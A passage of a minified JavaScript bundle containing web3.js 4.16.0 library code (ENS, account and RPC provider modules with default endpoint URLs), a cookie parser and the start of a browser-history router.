                o.methods.name(fi(s)).call()
            })
        }
    }
    var zn = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class sE extends mn {
        constructor(e, n) {
            super(n ?? ""),
            this.registryAddress = e ?? Td.main,
            this._registry = new f6(this.getContextObject(),e),
            this._resolver = new h6(this._registry)
        }
        getResolver(e) {
            return zn(this, void 0, void 0, function*() {
                return this._registry.getResolver(e)
            })
        }
        recordExists(e) {
            return zn(this, void 0, void 0, function*() {
                return this._registry.recordExists(e)
            })
        }
        getTTL(e) {
            return zn(this, void 0, void 0, function*() {
                return this._registry.getTTL(e)
            })
        }
        getOwner(e) {
            return zn(this, void 0, void 0, function*() {
                return this._registry.getOwner(e)
            })
        }
        getAddress(e, n=60) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.getAddress(e, n)
            })
        }
        getText(e, n) {
            return zn(this, void 0, void 0, function*() {
                return Sn(e) ? this._resolver.getText(yield this._resolver.getName(e, !1), n) : this._resolver.getText(e, n)
            })
        }
        getName(e, n=!0) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.getName(e, n)
            })
        }
        getPubkey(e) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.getPubkey(e)
            })
        }
        getContenthash(e) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.getContenthash(e)
            })
        }
        checkNetwork() {
            return zn(this, void 0, void 0, function*() {
                const e = Date.now() / 1e3;
                if (!this._lastSyncCheck || e - this._lastSyncCheck > 3600) {
                    const o = yield jN(this);
                    if (!(typeof o == "boolean" && !o))
                        throw new YT;
                    this._lastSyncCheck = e
                }
                if (this._detectedAddress)
                    return this._detectedAddress;
                const n = yield T0(this, Object.assign(Object.assign({}, this.defaultReturnFormat), {
                    number: Qn.HEX
                }))
                  , s = Td[TM[n]];
                if (typeof s > "u")
                    throw new VT(n);
                return this._detectedAddress = s,
                this._detectedAddress
            })
        }
        supportsInterface(e, n) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.supportsInterface(e, n)
            })
        }
        get events() {
            return this._registry.events
        }
        setAddress(e, n, s) {
            return zn(this, void 0, void 0, function*() {
                return this._resolver.setAddress(e, n, s)
            })
        }
    }
    var lr = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const m6 = t => lr(void 0, void 0, void 0, function*() {
        return (yield vO(t)).map(_i)
    })
      , p6 = (t, e) => lr(void 0, void 0, void 0, function*() {
        Ae.validate(["string"], [e]);
        const n = yield bO(t, e);
        return _i(n)
    })
      , g6 = (t, e, n, s) => lr(void 0, void 0, void 0, function*() {
        return Ae.validate(["address", "string", "uint"], [e, n, s]),
        AO(t, e, n, s)
    })
      , y6 = (t, e) => lr(void 0, void 0, void 0, function*() {
        return Ae.validate(["address"], [e]),
        wO(t, e)
    })
      , v6 = (t, e, n) => lr(void 0, void 0, void 0, function*() {
        return Ae.validate(["string", "string"], [e, n]),
        _O(t, e, n)
    })
      , b6 = (t, e, n, s) => lr(void 0, void 0, void 0, function*() {
        const o = pn(e, Ce, {
            transactionSchema: s?.customTransactionSchema
        });
        return EO(t, o, n)
    })
      , A6 = (t, e, n, s) => lr(void 0, void 0, void 0, function*() {
        const o = pn(e, Ce, {
            transactionSchema: s?.customTransactionSchema
        });
        return xO(t, o, n)
    })
      , w6 = (t, e, n, s) => lr(void 0, void 0, void 0, function*() {
        Ae.validate(["string", "address", "string"], [e, n, s]);
        const o = Ke(e) ? e : ii(e);
        return SO(t, o, n, s)
    })
      , _6 = (t, e, n) => lr(void 0, void 0, void 0, function*() {
        Ae.validate(["string", "string"], [e, n]);
        const s = Ke(e) ? e : ii(e);
        return TO(t, s, n)
    });
    var Qi = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class aE extends mn {
        getAccounts() {
            return Qi(this, void 0, void 0, function*() {
                return m6(this.requestManager)
            })
        }
        newAccount(e) {
            return Qi(this, void 0, void 0, function*() {
                return p6(this.requestManager, e)
            })
        }
        unlockAccount(e, n, s) {
            return Qi(this, void 0, void 0, function*() {
                return g6(this.requestManager, e, n, s)
            })
        }
        lockAccount(e) {
            return Qi(this, void 0, void 0, function*() {
                return y6(this.requestManager, e)
            })
        }
        importRawKey(e, n) {
            return Qi(this, void 0, void 0, function*() {
                return v6(this.requestManager, e, n)
            })
        }
        sendTransaction(e, n) {
            return Qi(this, void 0, void 0, function*() {
                return b6(this.requestManager, e, n, this.config)
            })
        }
        signTransaction(e, n) {
            return Qi(this, void 0, void 0, function*() {
                return A6(this.requestManager, e, n, this.config)
            })
        }
        sign(e, n, s) {
            return Qi(this, void 0, void 0, function*() {
                return w6(this.requestManager, e, n, s)
            })
        }
        ecRecover(e, n) {
            return Qi(this, void 0, void 0, function*() {
                return _6(this.requestManager, e, n)
            })
        }
    }
    var pi;
    (function(t) {
        t.HTTPS = "https",
        t.WebSocket = "wss"
    }
    )(pi || (pi = {}));
    var de;
    (function(t) {
        t.ETH_MAINNET = "eth_mainnet",
        t.ETH_SEPOLIA = "eth_sepolia",
        t.ETH_HOLESKY = "eth_holesky",
        t.POLYGON_MAINNET = "polygon_mainnet",
        t.POLYGON_AMOY = "polygon_amoy",
        t.AVALANCHE_C_MAINNET = "avalanche_c_mainnet",
        t.AVALANCHE_P_MAINNET = "avalanche_p_mainnet",
        t.AVALANCHE_X_MAINNET = "avalanche_x_mainnet",
        t.ARBITRUM_MAINNET = "arbitrum_mainnet",
        t.ARBITRUM_SEPOLIA = "arbitrum_sepolia",
        t.BASE_MAINNET = "base_mainnet",
        t.BASE_SEPOLIA = "base_sepolia",
        t.OPTIMISM_MAINNET = "optimism_mainnet",
        t.OPTIMISM_SEPOLIA = "optimism_sepolia",
        t.FANTOM_MAINNET = "fantom_mainnet",
        t.FANTOM_TESTNET = "fantom_testnet",
        t.DYMENSION_MAINNET = "dymension_mainnet",
        t.DYMENSION_TESTNET = "dymension_testnet",
        t.BNB_MAINNET = "bnb_mainnet",
        t.BNB_TESTNET = "bnb_testnet",
        t.BSC_MAINNET = "bsc_mainnet",
        t.BSC_TESTNET = "bsc_testnet",
        t.ARBITRUM_ONE = "arbitrum_one",
        t.ARBITRUM_NOVA = "arbitrum_nova",
        t.AVALANCHE_FUJI_C = "avalanche_fuji_c",
        t.AVALANCHE_FUJI_P = "avalanche_fuji_p",
        t.AVALANCHE_FUJI_X = "avalanche_fuji_x",
        t.BLAST_MAINNET = "blast_mainnet",
        t.OPBNB_MAINNET = "opbnb_mainnet",
        t.OPBNB_TESTNET = "opbnb_testnet",
        t.GNOSIS_MAINNET = "gnosis_mainnet",
        t.GNOSIS_CHIADO = "gnosis_chiado",
        t.PULSECHAIN_MAINNET = "pulsechain_mainnet",
        t.PULSECHAIN_TESTNET = "pulsechain_testnet",
        t.KAVA_MAINNET = "kava_mainnet",
        t.CRONOS_MAINNET = "cronos_mainnet",
        t.MANTLE_MAINNET = "mantle_mainnet",
        t.CHILIZ_MAINNET = "chiliz_mainnet",
        t.CHILIZ_SPICY = "chiliz_spicy",
        t.MOONBEAM_MAINNET = "moonbeam_mainnet",
        t.TAIKO_MAINNET = "taiko_mainnet",
        t.TAIKO_HEKLA = "taiko_hekla",
        t.LINEA_MAINNET = "linea_mainnet",
        t.LINEA_SEPOLIA = "linea_sepolia",
        t.BAHAMUT_MAINNET = "bahamut_mainnet",
        t.SCROLL_MAINNET = "scroll_mainnet",
        t.SCROLL_SEPOLIA = "scroll_sepolia",
        t.TRON_MAINNET = "tron_mainnet",
        t.SYSCOIN_MAINNET = "syscoin_mainnet",
        t.SYSCOIN_TANENBAUM = "syscoin_tanenbaum",
        t.MOONRIVER_MAINNET = "moonriver_mainnet",
        t.HAQQ_MAINNET = "haqq_mainnet",
        t.EVMOS_MAINNET = "evmos_mainnet",
        t.EVMOS_TESTNET = "evmos_testnet",
        t.BERACHAIN_TESTNET = "berachain_testnet"
    }
    )(de || (de = {}));
    const E6 = 1300;
    class x6 extends Re {
        constructor(e) {
            super("You've reach the rate limit of free RPC calls from our Partner Quick Nodes. There are two options you can either create a paid Quick Nodes account and get 20% off for 2 months using WEB3JS referral code, or use Free public RPC endpoint.", e),
            this.code = E6
        }
    }
    const S6 = 1301;
    class a1 extends Re {
        constructor(e) {
            super(`Invalid provider config options given for ${e}`),
            this.code = S6
        }
    }
    var T6 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class oE extends u0 {
        constructor(e, n, s, o, l) {
            if (super(),
            l !== void 0 && n === pi.HTTPS && !("providerOptions"in l))
                throw new a1("HTTP Provider");
            if (l !== void 0 && n === pi.WebSocket && !("socketOptions"in l || "reconnectOptions"in l))
                throw new a1("Websocket Provider");
            this.transport = n,
            n === pi.HTTPS ? this.provider = new Kd(this.getRPCURL(e, n, s, o),l) : n === pi.WebSocket && (this.provider = new bw(this.getRPCURL(e, n, s, o),l?.socketOptions,l?.reconnectOptions))
        }
        request(e, n) {
            return T6(this, void 0, void 0, function*() {
                return this.transport === pi.HTTPS ? yield this.provider.request(e, n) : this.provider.request(e)
            })
        }
        getStatus() {
            return this.provider.getStatus()
        }
        supportsSubscriptions() {
            return this.provider.supportsSubscriptions()
        }
        once(e, n) {
            var s;
            !((s = this.provider) === null || s === void 0) && s.once && this.provider.once(e, n)
        }
        removeAllListeners(e) {
            var n;
            !((n = this.provider) === null || n === void 0) && n.removeAllListeners && this.provider.removeAllListeners(e)
        }
        connect() {
            var e;
            !((e = this.provider) === null || e === void 0) && e.connect && this.provider.connect()
        }
        disconnect(e, n) {
            var s;
            !((s = this.provider) === null || s === void 0) && s.disconnect && this.provider.disconnect(e, n)
        }
        reset() {
            var e;
            !((e = this.provider) === null || e === void 0) && e.reset && this.provider.reset()
        }
        on(e, n) {
            this.provider && this.provider.on(e, n)
        }
        removeListener(e, n) {
            this.provider && this.provider.removeListener(e, n)
        }
    }
    var R6 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Lt = t => t !== void 0 && t.trim().length > 0;
    class B6 extends oE {
        constructor(e=de.ETH_MAINNET, n=pi.HTTPS, s="", o="", l) {
            super(e, n, s, o, l)
        }
        request(e, n) {
            const s = Object.create(null, {
                request: {
                    get: () => super.request
                }
            });
            return R6(this, void 0, void 0, function*() {
                try {
                    return yield s.request.call(this, e, n)
                } catch (o) {
                    throw o instanceof hi && o.statusCode === 429 ? new x6(o) : o
                }
            })
        }
        getRPCURL(e, n, s, o) {
            let l = ""
              , u = "";
            switch (e) {
            case de.ETH_MAINNET:
                l = Lt(o) ? o : "powerful-holy-bush.quiknode.pro",
                u = Lt(s) ? s : "3240624a343867035925ff7561eb60dfdba2a668";
                break;
            case de.ETH_SEPOLIA:
                l = Lt(o) ? o : "dimensional-fabled-glitter.ethereum-sepolia.quiknode.pro",
                u = Lt(s) ? s : "382a3b5a4b938f2d6e8686c19af4b22921fde2cd";
                break;
            case de.ETH_HOLESKY:
                l = Lt(o) ? o : "yolo-morning-card.ethereum-holesky.quiknode.pro",
                u = Lt(s) ? s : "481ebe70638c4dcf176af617a16d02ab866b9af9";
                break;
            case de.ARBITRUM_MAINNET:
                l = Lt(o) ? o : "autumn-divine-dinghy.arbitrum-mainnet.quiknode.pro",
                u = Lt(s) ? s : "a5d7bfbf60b5ae9ce3628e53d69ef50d529e9a8c";
                break;
            case de.ARBITRUM_SEPOLIA:
                l = Lt(o) ? o : "few-patient-pond.arbitrum-sepolia.quiknode.pro",
                u = Lt(s) ? s : "3be985450970628c860b959c65cd2642dcafe53c";
                break;
            case de.BNB_MAINNET:
                l = Lt(o) ? o : "purple-empty-reel.bsc.quiknode.pro",
                u = Lt(s) ? s : "ebf6c532961e21f092ff2facce1ec4c89c540158";
                break;
            case de.BNB_TESTNET:
                l = Lt(o) ? o : "floral-rough-scion.bsc-testnet.quiknode.pro",
                u = Lt(s) ? s : "5b297e5acff5f81f4c37ebf6f235f7299b6f9d28";
                break;
            case de.POLYGON_MAINNET:
                l = Lt(o) ? o : "small-chaotic-moon.matic.quiknode.pro",
                u = Lt(s) ? s : "847569f8a017e84d985e10d0f44365d965a951f1";
                break;
            case de.POLYGON_AMOY:
                l = Lt(o) ? o : "prettiest-side-shape.matic-amoy.quiknode.pro",
                u = Lt(s) ? s : "79a9476eea661d4f82de614db1d8a895b14b881c";
                break;
            default:
                throw new Error("Network info not avalible.")
            }
            return `${n}://${l}/${u}`
        }
    }
    const C6 = t => t !== void 0 && t.trim().length > 0
      , I6 = [de.DYMENSION_MAINNET, de.DYMENSION_TESTNET, de.KAVA_MAINNET, de.CRONOS_MAINNET, de.POLYGON_MAINNET];
    class Od extends oE {
        constructor(e=de.ETH_MAINNET, n=pi.HTTPS, s="", o) {
            super(e, n, "", s, o)
        }
        getRPCURL(e, n, s, o) {
            if (!Od.networkHostMap[e])
                throw new Error("Network info not avalible.");
            const l = `${Od.networkHostMap[e]}.publicnode.com`
              , u = C6(o) ? o : l;
            return I6.includes(e) && n === pi.WebSocket ? `${n}://${u}/websocket` : `${n}://${u}`
        }
    }
    Od.networkHostMap = {
        [de.POLYGON_AMOY]: "polygon-amoy-bor-rpc",
        [de.DYMENSION_MAINNET]: "dymension-evm-rpc",
        [de.DYMENSION_TESTNET]: "dymension-testnet-evm-rpc",
        [de.BLAST_MAINNET]: "blast-rpc",
        [de.GNOSIS_MAINNET]: "gnosis-rpc",
        [de.PULSECHAIN_MAINNET]: "pulsechain-rpc",
        [de.PULSECHAIN_TESTNET]: "pulsechain-testnet-rpc",
        [de.KAVA_MAINNET]: "kava-evm-rpc",
        [de.CRONOS_MAINNET]: "cronos-evm-rpc",
        [de.MANTLE_MAINNET]: "mantle-rpc",
        [de.TAIKO_MAINNET]: "taiko-rpc",
        [de.TAIKO_HEKLA]: "taiko-hekla-rpc",
        [de.LINEA_MAINNET]: "linea-rpc",
        [de.LINEA_SEPOLIA]: "linea-sepolia-rpc",
        [de.SCROLL_MAINNET]: "scroll-rpc",
        [de.SCROLL_SEPOLIA]: "scroll-sepolia-rpc",
        [de.SYSCOIN_MAINNET]: "syscoin-evm-rpc",
        [de.SYSCOIN_TANENBAUM]: "syscoin-tanenbaum-evm-rpc",
        [de.HAQQ_MAINNET]: "haqq-evm-rpc",
        [de.EVMOS_MAINNET]: "evmos-evm-rpc",
        [de.EVMOS_TESTNET]: "evmos-testnet-evm-rpc",
        [de.BERACHAIN_TESTNET]: "berachain-testnet-evm-rpc",
        [de.ETH_MAINNET]: "ethereum-rpc",
        [de.ETH_SEPOLIA]: "ethereum-sepolia-rpc",
        [de.ETH_HOLESKY]: "ethereum-holesky-rpc",
        [de.BSC_MAINNET]: "bsc-rpc",
        [de.BSC_TESTNET]: "bsc-testnet-rpc",
        [de.POLYGON_MAINNET]: "polygon-bor-rpc",
        [de.BASE_MAINNET]: "base-rpc",
        [de.BASE_SEPOLIA]: "base-sepolia-rpc",
        [de.ARBITRUM_ONE]: "arbitrum-one-rpc",
        [de.ARBITRUM_NOVA]: "arbitrum-nova-rpc",
        [de.ARBITRUM_SEPOLIA]: "arbitrum-sepolia-rpc",
        [de.AVALANCHE_C_MAINNET]: "avalanche-c-chain-rpc",
        [de.AVALANCHE_P_MAINNET]: "avalanche-p-chain-rpc",
        [de.AVALANCHE_X_MAINNET]: "avalanche-x-chain-rpc",
        [de.AVALANCHE_FUJI_C]: "avalanche-fuji-c-chain-rpc",
        [de.AVALANCHE_FUJI_P]: "avalanche-fuji-p-chain-rpc",
        [de.AVALANCHE_FUJI_X]: "avalanche-fuji-x-chain-rpc",
        [de.OPTIMISM_MAINNET]: "optimism-rpc",
        [de.OPTIMISM_SEPOLIA]: "optimism-sepolia-rpc",
        [de.FANTOM_MAINNET]: "fantom-rpc",
        [de.FANTOM_TESTNET]: "fantom-testnet-rpc",
        [de.OPBNB_MAINNET]: "opbnb-rpc",
        [de.OPBNB_TESTNET]: "opbnb-testnet-rpc",
        [de.GNOSIS_CHIADO]: "gnosis-chiado-rpc",
        [de.CHILIZ_MAINNET]: "chiliz-rpc",
        [de.CHILIZ_SPICY]: "chiliz-spicy-rpc",
        [de.MOONBEAM_MAINNET]: "moonbeam-rpc",
        [de.BAHAMUT_MAINNET]: "bahamut-rpc",
        [de.TRON_MAINNET]: "tron-evm-rpc",
        [de.MOONRIVER_MAINNET]: "moonriver-rpc"
    };
    const k6 = new B6
      , O6 = {
        encodeEventSignature: I0,
        encodeFunctionCall: IN,
        encodeFunctionSignature: Kl,
        encodeParameter: Tp,
        encodeParameters: rf,
        decodeParameter: R_,
        decodeParameters: xs,
        decodeLog: B_
    };
    var vl = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const N6 = t => {
        const e = (u, d) => vl(void 0, void 0, void 0, function*() {
            const p = yield yM(u, t)
              , h = ee({
                format: "bytes"
            }, d, Ce);
            return pk(p, h)
        })
          , n = u => {
            const d = _0(u);
            return Object.assign(Object.assign({}, d), {
                signTransaction: p => vl(void 0, void 0, void 0, function*() {
                    return e(p, d.privateKey)
                })
            })
        }
          , s = (u, d, p) => vl(void 0, void 0, void 0, function*() {
            var h;
            const m = yield bk(u, d, (h = p?.nonStrict) !== null && h !== void 0 ? h : !0);
            return Object.assign(Object.assign({}, m), {
                signTransaction: y => vl(void 0, void 0, void 0, function*() {
                    return e(y, m.privateKey)
                })
            })
        })
          , o = () => {
            const u = vk();
            return Object.assign(Object.assign({}, u), {
                signTransaction: d => vl(void 0, void 0, void 0, function*() {
                    return e(d, u.privateKey)
                })
            })
        }
          , l = new vd({
            create: o,
            privateKeyToAccount: n,
            decrypt: s
        });
        return {
            signTransaction: e,
            create: o,
            privateKeyToAccount: n,
            decrypt: s,
            recoverTransaction: gk,
            hashMessage: w0,
            sign: Vw,
            recover: yp,
            encrypt: Yw,
            wallet: l,
            privateKeyToAddress: Wd,
            parseAndValidatePrivateKey: lo,
            privateKeyToPublicKey: yk
        }
    }
      , M6 = {
        version: "4.16.0"
    };
    var D6 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    }, Nd;
    (function(t) {
        t.eip6963announceProvider = "eip6963:announceProvider",
        t.eip6963requestProvider = "eip6963:requestProvider"
    }
    )(Nd || (Nd = {}));
    const Xm = new Map
      , lE = "web3:providersMapUpdated"
      , L6 = () => D6(void 0, void 0, void 0, function*() {
        return new Promise( (t, e) => {
            typeof window > "u" && e(new Error("window object not available, EIP-6963 is intended to be used within a browser")),
            window.addEventListener(Nd.eip6963announceProvider, n => {
                Xm.set(n.detail.info.uuid, n.detail);
                const s = new CustomEvent(lE,{
                    detail: Xm
                });
                window.dispatchEvent(s),
                t(Xm)
            }
            ),
            window.dispatchEvent(new Event(Nd.eip6963requestProvider))
        }
        )
    })
      , U6 = t => {
        if (typeof window > "u")
            throw new Error("window object not available, EIP-6963 is intended to be used within a browser");
        window.addEventListener(lE, t)
    }
    ;
    class Wn extends mn {
        constructor(e=k6) {
            var n;
            (Ee(e) || typeof e == "string" && e.trim() === "" || typeof e != "string" && !gd(e) && !e.provider) && console.warn("NOTE: web3.js is running without provider. You need to pass a provider in order to interact with the network!");
            let s = {};
            typeof e == "string" || gd(e) ? s.provider = e : e ? s = e : s = {},
            s.registeredSubscriptions = Object.assign(Object.assign({}, Bp), (n = s.registeredSubscriptions) !== null && n !== void 0 ? n : {}),
            super(s);
            const o = N6(this);
            this._wallet = o.wallet,
            this._accountProvider = o,
            this.utils = vw;
            const l = this;
            class u extends Ss {
                constructor(h, m, y, w, E) {
                    if (Dr(m) && Dr(y))
                        throw new $b("Should not provide options at both 2nd and 3rd parameters");
                    let S, _ = {}, x, b;
                    if (!Ee(m) && typeof m != "object" && typeof m != "string")
                        throw new $b;
                    if (typeof m == "string" && (S = m),
                    Dr(m) ? _ = m : Dr(y) ? _ = y : _ = {},
                    m instanceof mn ? x = m : y instanceof mn ? x = y : w instanceof mn ? x = w : x = l.getContextObject(),
                    E ? b = E : Ki(y) ? b = y : Ki(w) && (b = w),
                    super(h, S, _, x, b),
                    super.subscribeToContextEvents(l),
                    !Ee(d)) {
                        const I = d.getTransactionMiddleware();
                        Ee(I) || super.setTransactionMiddleware(I)
                    }
                }
            }
            const d = l.use(sf);
            this.eth = Object.assign(d, {
                ens: l.use(sE, Td.main),
                Iban: Rt,
                net: l.use(t_),
                personal: l.use(aE),
                Contract: u,
                abi: O6,
                accounts: o
            })
        }
    }
    Wn.version = M6.version;
    Wn.utils = vw;
    Wn.requestEIP6963Providers = L6;
    Wn.onNewProviderDiscovered = U6;
    Wn.modules = {
        Web3Eth: sf,
        Iban: Rt,
        Net: t_,
        ENS: sE,
        Personal: aE
    };
    var bl = {}, o1;
    function j6() {
        if (o1)
            return bl;
        o1 = 1,
        Object.defineProperty(bl, "__esModule", {
            value: !0
        }),
        bl.parse = u,
        bl.serialize = h;
        const t = /^[\u0021-\u003A\u003C\u003E-\u007E]+$/
          , e = /^[\u0021-\u003A\u003C-\u007E]*$/
          , n = /^([.]?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)([.][a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/i
          , s = /^[\u0020-\u003A\u003D-\u007E]*$/
          , o = Object.prototype.toString
          , l = ( () => {
            const w = function() {};
            return w.prototype = Object.create(null),
            w
        }
        )();
        function u(w, E) {
            const S = new l
              , _ = w.length;
            if (_ < 2)
                return S;
            const x = E?.decode || m;
            let b = 0;
            do {
                const I = w.indexOf("=", b);
                if (I === -1)
                    break;
                const O = w.indexOf(";", b)
                  , z = O === -1 ? _ : O;
                if (I > z) {
                    b = w.lastIndexOf(";", I - 1) + 1;
                    continue
                }
                const L = d(w, b, I)
                  , Y = p(w, I, L)
                  , W = w.slice(L, Y);
                if (S[W] === void 0) {
                    let D = d(w, I + 1, z)
                      , se = p(w, z, D);
                    const Z = x(w.slice(D, se));
                    S[W] = Z
                }
                b = z + 1
            } while (b < _);
            return S
        }
        function d(w, E, S) {
            do {
                const _ = w.charCodeAt(E);
                if (_ !== 32 && _ !== 9)
                    return E
            } while (++E < S);
            return S
        }
        function p(w, E, S) {
            for (; E > S; ) {
                const _ = w.charCodeAt(--E);
                if (_ !== 32 && _ !== 9)
                    return E + 1
            }
            return S
        }
        function h(w, E, S) {
            const _ = S?.encode || encodeURIComponent;
            if (!t.test(w))
                throw new TypeError(`argument name is invalid: ${w}`);
            const x = _(E);
            if (!e.test(x))
                throw new TypeError(`argument val is invalid: ${E}`);
            let b = w + "=" + x;
            if (!S)
                return b;
            if (S.maxAge !== void 0) {
                if (!Number.isInteger(S.maxAge))
                    throw new TypeError(`option maxAge is invalid: ${S.maxAge}`);
                b += "; Max-Age=" + S.maxAge
            }
            if (S.domain) {
                if (!n.test(S.domain))
                    throw new TypeError(`option domain is invalid: ${S.domain}`);
                b += "; Domain=" + S.domain
            }
            if (S.path) {
                if (!s.test(S.path))
                    throw new TypeError(`option path is invalid: ${S.path}`);
                b += "; Path=" + S.path
            }
            if (S.expires) {
                if (!y(S.expires) || !Number.isFinite(S.expires.valueOf()))
                    throw new TypeError(`option expires is invalid: ${S.expires}`);
                b += "; Expires=" + S.expires.toUTCString()
            }
            if (S.httpOnly && (b += "; HttpOnly"),
            S.secure && (b += "; Secure"),
            S.partitioned && (b += "; Partitioned"),
            S.priority)
                switch (typeof S.priority == "string" ? S.priority.toLowerCase() : void 0) {
                case "low":
                    b += "; Priority=Low";
                    break;
                case "medium":
                    b += "; Priority=Medium";
                    break;
                case "high":
                    b += "; Priority=High";
                    break;
                default:
                    throw new TypeError(`option priority is invalid: ${S.priority}`)
                }
            if (S.sameSite)
                switch (typeof S.sameSite == "string" ? S.sameSite.toLowerCase() : S.sameSite) {
                case !0:
                case "strict":
                    b += "; SameSite=Strict";
                    break;
                case "lax":
                    b += "; SameSite=Lax";
                    break;
                case "none":
                    b += "; SameSite=None";
                    break;
                default:
                    throw new TypeError(`option sameSite is invalid: ${S.sameSite}`)
                }
            return b
        }
        function m(w) {
            if (w.indexOf("%") === -1)
                return w;
            try {
                return decodeURIComponent(w)
            } catch {
                return w
            }
        }
        function y(w) {
            return o.call(w) === "[object Date]"
        }
        return bl
    }
    j6();
    var l1 = "popstate";
    function P6(t={}) {
        function e(s, o) {
            let {pathname: l, search: u, hash: d} = s.location;
            return Dp("", {
                pathname: l,
                search: u,
                hash: d
            }, o.state && o.state.usr || null, o.state && o.state.key || "default")
        }
        function n(s, o) {
            return typeof o == "string" ? o : tc(o)
        }
        return z6(e, n, null, t)
    }
    function yt(t, e) {
        if (t === !1 || t === null || typeof t > "u")
            throw new Error(e)
    }
    function wi(t, e) {
        if (!t) {
            typeof console < "u" && console.warn(e);
            try {
                throw new Error(e)
            } catch {}
        }
    }
    function H6() {
        return Math.random().toString(36).substring(2, 10)
    }
    function c1(t, e) {
        return {
            usr: t.state,
            key: t.key,
            idx: e
        }
    }
    function Dp(t, e, n=null, s) {
        return {
            pathname: typeof t == "string" ? t : t.pathname,
            search: "",
            hash: "",
            ...typeof e == "string" ? ho(e) : e,
            state: n,
            key: e && e.key || s || H6()
        }
    }
    function tc({pathname: t="/", search: e="", hash: n=""}) {
        return e && e !== "?" && (t += e.charAt(0) === "?" ? e : "?" + e),
        n && n !== "#" && (t += n.charAt(0) === "#" ? n : "#" + n),
        t
    }
    function ho(t) {
        let e = {};
        if (t) {
            let n = t.indexOf("#");
            n >= 0 && (e.hash = t.substring(n),
            t = t.substring(0, n));
            let s = t.indexOf("?");
            s >= 0 && (e.search = t.substring(s),
            t = t.substring(0, s)),
            t && (e.pathname = t)
        }
        return e
    }
    function z6(t, e, n, s={}) {
        let {window: o=document.defaultView, v5Compat: l=!1} = s
          , u = o.history
          , d = "POP"
          , p = null
          , h = m();
        h == null && (h = 0,
        u.replaceState({
            ...u.state,
            idx: h
        }, ""));
        function m() {
            return (u.state || {
                idx: null
            }).idx
        }
        function y() {
            d = "POP";
            let x = m()
              , b = x == null ? null : x - h;
            h = x,
            p && p({
                action: d,
                location: _.location,
                delta: b
            })
        }
        function w(x, b) {
            d = "PUSH";
            let I = Dp(_.location, x, b);
            h = m() + 1;
            let O = c1(I, h)
              , z = _.createHref(I);
            try {
                u.pushState(O, "", z)
            } catch (L) {
                if (L instanceof DOMException && L.name === "DataCloneError")
                    throw L;
                o.location.assign(z)
            }
            l && p && p({
                action: d,
                location: _.location,
                delta: 1
            })
        }
        function E(x, b) {
            d = "REPLACE";
            let I = Dp(_.location, x, b);
            h = m();
            let O = c1(I, h)
              , z = _.createHref(I);
            u.replaceState(O, "", z),
            l && p && p({
                action: d,
                location: _.location,
                delta: 0
            })
        }
        function S(x) {
            return G6(x)
        }
        let _ = {
            get action() {
                return d
            },
            get location() {
                return t(o, u)
            },
            listen(x) {
                if (p)
                    throw new Error("A history only accepts one active listener");
                return o.addEventListener(l1, y),
                p = x,
                () => {
                    o.removeEventListener(l1, y),
                    p = null
                }
            },
            createHref(x) {
                return e(o, x)
            },
            createURL: S,
            encodeLocation(x) {
                let b = S(x);
                return {
